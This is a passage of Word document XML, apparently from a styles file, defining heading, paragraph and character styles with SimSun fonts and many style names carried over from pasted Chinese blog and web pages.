      <w:sz w:val="36"/>
      <w:szCs w:val="36"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="30">
    <w:name w:val="标题 3 字符"/>
    <w:basedOn w:val="a0"/>
    <w:link w:val="3"/>
    <w:uiPriority w:val="9"/>
    <w:qFormat/>
    <w:rsid w:val="00191162"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="32"/>
      <w:szCs w:val="32"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="HTML">
    <w:name w:val="HTML Preformatted"/>
    <w:basedOn w:val="a"/>
    <w:link w:val="HTML0"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="001911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qFormat/>
    <w:rsid w:val="00191162"/>
    <w:rPr>
      <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
      <w:kern w:val="0"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="a7">
    <w:name w:val="Normal (Web)"/>
    <w:basedOn w:val="a"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="00191162"/>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qFormat/>
    <w:rsid w:val="00191162"/>
    <w:rPr>
      <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="md-end-block">
    <w:name w:val="md-end-block"/>
    <w:basedOn w:val="a"/>
    <w:qFormat/>
    <w:rsid w:val="00191162"/>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qFormat/>
    <w:rsid w:val="00191162"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="devslash">
    <w:name w:val="dev__slash"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00E912B5"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="devtitle">
    <w:name w:val="dev__title"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00E912B5"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="a8">
    <w:name w:val="List Paragraph"/>
    <w:basedOn w:val="a"/>
    <w:uiPriority w:val="34"/>
    <w:qFormat/>
    <w:rsid w:val="00E912B5"/>
    <w:pPr>
      <w:ind w:firstLineChars="200" w:firstLine="420"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="40">
    <w:name w:val="标题 4 字符"/>
    <w:basedOn w:val="a0"/>
    <w:link w:val="4"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="00870C85"/>
    <w:rPr>
      <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
      <w:b/>
      <w:bCs/>
      <w:kern w:val="0"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="numbering" w:customStyle="1" w:styleId="11">
    <w:name w:val="无列表1"/>
    <w:next w:val="a2"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00870C85"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="msonormal0">
    <w:name w:val="msonormal"/>
    <w:basedOn w:val="a"/>
    <w:rsid w:val="00870C85"/>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70C85"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="line-numbers-rows">
    <w:name w:val="line-numbers-rows"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00870C85"/>
  </w:style>
  <w:style w:type="character" w:styleId="a9">
    <w:name w:val="Strong"/>
    <w:basedOn w:val="a0"/>
    <w:uiPriority w:val="22"/>
    <w:qFormat/>
    <w:rsid w:val="00870C85"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="aa">
    <w:name w:val="Emphasis"/>
    <w:basedOn w:val="a0"/>
    <w:uiPriority w:val="20"/>
    <w:qFormat/>
    <w:rsid w:val="00870C85"/>
    <w:rPr>
      <w:i/>
      <w:iCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="1loh5">
    <w:name w:val="_1loh_5"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00870C85"/>
  </w:style>
  <w:style w:type="character" w:styleId="ab">
    <w:name w:val="Hyperlink"/>
    <w:basedOn w:val="a0"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00870C85"/>
    <w:rPr>
      <w:color w:val="0000FF"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="ac">
    <w:name w:val="FollowedHyperlink"/>
    <w:basedOn w:val="a0"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00870C85"/>
    <w:rPr>
      <w:color w:val="800080"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="3zdmij">
    <w:name w:val="_3zdmij"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00870C85"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="cnblogscodecopy">
    <w:name w:val="cnblogs_code_copy"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="001E7149"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="diggnum">
    <w:name w:val="diggnum"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="001E7149"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="burynum">
    <w:name w:val="burynum"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="001E7149"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="commentboxtab">
    <w:name w:val="commentbox_tab"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="001E7149"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="commenticon">
    <w:name w:val="comment_icon"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="001E7149"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="liscore">
    <w:name w:val="liscore"/>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lirank">
    <w:name w:val="lirank"/>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recentcommenttitle">
    <w:name w:val="recent_comment_title"/>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recentcommentbody">
    <w:name w:val="recent_comment_body"/>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recentcommentauthor">
    <w:name w:val="recent_comment_author"/>
    <w:basedOn w:val="a"/>
    <w:rsid w:val="001E7149"/>
    <w:pPr>
      <w:widowControl/>
      <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
      <w:jc w:val="left"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
      <w:kern w:val="0"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="cnblogscodecollapse">
    <w:name w:val="cnblogs_code_collapse"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="001E7149"/>
  </w:style>
  <w:style w:type="character" w:styleId="ad">
    <w:name w:val="Unresolved Mention"/>
    <w:basedOn w:val="a0"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="001E7149"/>
    <w:rPr>
      <w:color w:val="605E5C"/>
      <w:shd w:val="clear" w:color="auto" w:fill="E1DFDD"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="md-tag">
    <w:name w:val="md-tag"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00843D31"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="pre">
    <w:name w:val="pre"/>
    <w:basedOn w:val="a"/>
    <w:rsid w:val="003942C2"/>
    <w:pPr>
      <w:widowControl/>
      <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
      <w:jc w:val="left"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
      <w:kern w:val="0"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="line">
    <w:name w:val="line"/>
    <w:basedOn w:val="a"/>
    <w:rsid w:val="003942C2"/>
    <w:pPr>
      <w:widowControl/>
      <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
      <w:jc w:val="left"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
      <w:kern w:val="0"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="mathjaxpreview">
    <w:name w:val="mathjax_preview"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00717181"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="mathjax">
    <w:name w:val="mathjax"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00717181"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="math">
    <w:name w:val="math"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00717181"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="noerror">
    <w:name w:val="noerror"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00717181"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="mjxassistivemathml">
    <w:name w:val="mjx_assistive_mathml"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00717181"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="columnpageheader-titlemeta">
    <w:name w:val="columnpageheader-titlemeta"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="007A6093"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="voters">
    <w:name w:val="voters"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="007A6093"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="ztext-empty-paragraph">
    <w:name w:val="ztext-empty-paragraph"/>
    <w:basedOn w:val="a"/>
    <w:rsid w:val="007A6093"/>
    <w:pPr>
      <w:widowControl/>
      <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
      <w:jc w:val="left"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
      <w:kern w:val="0"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="tag-content">
    <w:name w:val="tag-content"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="007A6093"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="postitem-summary">
    <w:name w:val="postitem-summary"/>
    <w:basedOn w:val="a"/>
    <w:rsid w:val="007A6093"/>
    <w:pPr>
      <w:widowControl/>
      <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
      <w:jc w:val="left"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
      <w:kern w:val="0"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="postitem-footertitle">
    <w:name w:val="postitem-footertitle"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="007A6093"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="50">
    <w:name w:val="标题 5 字符"/>
    <w:basedOn w:val="a0"/>
    <w:link w:val="5"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="001C47AF"/>
    <w:rPr>
      <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
      <w:b/>
      <w:bCs/>
      <w:kern w:val="0"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="app-control">
    <w:name w:val="app-control"/>
    <w:basedOn w:val="a"/>
    <w:rsid w:val="001C47AF"/>
    <w:pPr>
      <w:widowControl/>
      <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
      <w:jc w:val="left"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
      <w:kern w:val="0"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="sub-menu-box">
    <w:name w:val="sub-menu-box"/>
    <w:basedOn w:val="a"/>
    <w:rsid w:val="001C47AF"/>
    <w:pPr>
      <w:widowControl/>
      <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
      <w:jc w:val="left"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
      <w:kern w:val="0"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="write-bolg-btn">
    <w:name w:val="write-bolg-btn"/>
    <w:basedOn w:val="a"/>
    <w:rsid w:val="001C47AF"/>
    <w:pPr>
      <w:widowControl/>
      <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
      <w:jc w:val="left"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
      <w:kern w:val="0"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="gitchat">
    <w:name w:val="gitchat"/>
    <w:basedOn w:val="a"/>
    <w:rsid w:val="001C47AF"/>
    <w:pPr>
      <w:widowControl/>
      <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
      <w:jc w:val="left"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
      <w:kern w:val="0"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="userlogin">
    <w:name w:val="userlogin"/>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name">
    <w:name w:val="name"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="001C47AF"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="flag">
    <w:name w:val="flag"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="001C47AF"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="personal-home-page">
    <w:name w:val="personal-home-page"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="001C47AF"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="count">
    <w:name w:val="count"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="001C47AF"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="clearfix">
    <w:name w:val="clearfix"/>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12">
    <w:name w:val="标题1"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="001C47AF"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="text">
    <w:name w:val="text"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="001C47AF"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="text-center">
    <w:name w:val="text-center"/>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time">
    <w:name w:val="time"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="001C47AF"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="read">
    <w:name w:val="read"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="001C47AF"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="comment">
    <w:name w:val="comment"/>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c-gray">
    <w:name w:val="c-gray"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="001C47AF"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="read-count">
    <w:name w:val="read-count"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="001C47AF"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="get-collection">
    <w:name w:val="get-collection"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="001C47AF"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="label">
    <w:name w:val="label"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="001C47AF"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="tool-item">
    <w:name w:val="tool-item"/>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13">
    <w:name w:val="日期1"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="001C47AF"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="desc">
    <w:name w:val="desc"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="001C47AF"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="data">
    <w:name w:val="data"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="001C47AF"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="z-">
    <w:name w:val="HTML Top of Form"/>
    <w:basedOn w:val="a"/>
    <w:next w:val="a"/>
    <w:link w:val="z-0"/>
    <w:hidden/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="001C47AF"/>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1C47AF"/>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1C47AF"/>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1C47AF"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:eastAsia="宋体" w:hAnsi="Arial" w:cs="Arial"/>
      <w:vanish/>
      <w:kern w:val="0"/>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="from-where">
    <w:name w:val="from-where"/>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blogtitlebox">
    <w:name w:val="blog_title_box"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="001C47AF"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="blogtitle">
    <w:name w:val="blog_title"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="001C47AF"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="date-and-readnum">
    <w:name w:val="date-and-readnum"/>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hover-hide">
    <w:name w:val="hover-hide"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="001C47AF"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="txt">
    <w:name w:val="txt"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="001C47AF"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="right-dotte">
    <w:name w:val="right-dotte"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="001C47AF"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="right-item">
    <w:name w:val="right-item"/>
    <w:basedOn w:val="a"/>
    <w:rsid w:val="001C47AF"/>
    <w:pPr>
      <w:widowControl/>
      <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
      <w:jc w:val="left"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
      <w:kern w:val="0"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="downloadmarkbutton">
    <w:name w:val="download_mark_button"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="001C47AF"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="show-txt">
    <w:name w:val="show-txt"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="001C47AF"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="reply">
    <w:name w:val="reply"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="001C47AF"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="md-expand">
    <w:name w:val="md-expand"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00A63022"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="md-line">
    <w:name w:val="md-line"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00A63022"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="md-meta">
    <w:name w:val="md-meta"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00A63022"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="comment-line-box">
    <w:name w:val="comment-line-box"/>
    <w:basedOn w:val="a"/>
    <w:rsid w:val="00A63022"/>
    <w:pPr>
      <w:widowControl/>
      <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
      <w:jc w:val="left"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
      <w:kern w:val="0"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="colon">
    <w:name w:val="colon"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00A63022"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="floor-num">
    <w:name w:val="floor-num"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00A63022"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="new-comment">
    <w:name w:val="new-comment"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00A63022"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="replay-box">
    <w:name w:val="replay-box"/>
    <w:basedOn w:val="a"/>
    <w:rsid w:val="00A63022"/>
    <w:pPr>
      <w:widowControl/>
      <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
      <w:jc w:val="left"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
      <w:kern w:val="0"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="richmediameta">
    <w:name w:val="rich_media_meta"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00EF28F6"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="jsdarkmode3">
    <w:name w:val="js_darkmode__3"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00EF28F6"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="jsdarkmode4">
    <w:name w:val="js_darkmode__4"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00EF28F6"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="jsdarkmode6">
    <w:name w:val="js_darkmode__6"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00EF28F6"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="jsdarkmode7">
    <w:name w:val="js_darkmode__7"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00EF28F6"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="jsdarkmode9">
    <w:name w:val="js_darkmode__9"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00EF28F6"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="jsdarkmode10">
    <w:name w:val="js_darkmode__10"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00EF28F6"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="jsdarkmode11">
    <w:name w:val="js_darkmode__11"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00EF28F6"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="jsdarkmode12">
    <w:name w:val="js_darkmode__12"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00EF28F6"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="jsdarkmode13">
    <w:name w:val="js_darkmode__13"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00EF28F6"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="jsdarkmode15">
    <w:name w:val="js_darkmode__15"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00EF28F6"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="jsdarkmode16">
    <w:name w:val="js_darkmode__16"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00EF28F6"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="jsdarkmode17">
    <w:name w:val="js_darkmode__17"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00EF28F6"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="jsdarkmode19">
    <w:name w:val="js_darkmode__19"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00EF28F6"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="jsdarkmode20">
    <w:name w:val="js_darkmode__20"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00EF28F6"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="jsdarkmode21">
    <w:name w:val="js_darkmode__21"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00EF28F6"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="jsdarkmode22">
    <w:name w:val="js_darkmode__22"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00EF28F6"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="jsdarkmode24">
    <w:name w:val="js_darkmode__24"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00EF28F6"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="jsdarkmode25">
    <w:name w:val="js_darkmode__25"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00EF28F6"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="jsdarkmode26">
    <w:name w:val="js_darkmode__26"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00EF28F6"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="jsdarkmode27">
    <w:name w:val="js_darkmode__27"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00EF28F6"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="jsdarkmode28">
    <w:name w:val="js_darkmode__28"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00EF28F6"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="jsdarkmode29">
    <w:name w:val="js_darkmode__29"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00EF28F6"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="jsdarkmode30">
    <w:name w:val="js_darkmode__30"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00EF28F6"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="jsdarkmode31">
    <w:name w:val="js_darkmode__31"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00EF28F6"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="jsdarkmode32">
    <w:name w:val="js_darkmode__32"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00EF28F6"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="jsdarkmode33">
    <w:name w:val="js_darkmode__33"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00EF28F6"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="jsdarkmode34">
    <w:name w:val="js_darkmode__34"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00EF28F6"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="jsdarkmode35">
    <w:name w:val="js_darkmode__35"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00EF28F6"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="jsdarkmode36">
    <w:name w:val="js_darkmode__36"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00EF28F6"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="jsdarkmode37">
    <w:name w:val="js_darkmode__37"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00EF28F6"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="jsdarkmode38">
    <w:name w:val="js_darkmode__38"/>
    <w:basedOn w:val="a0"/>
    <w:rsid w:val="00EF28F6"/>
  </w:style>
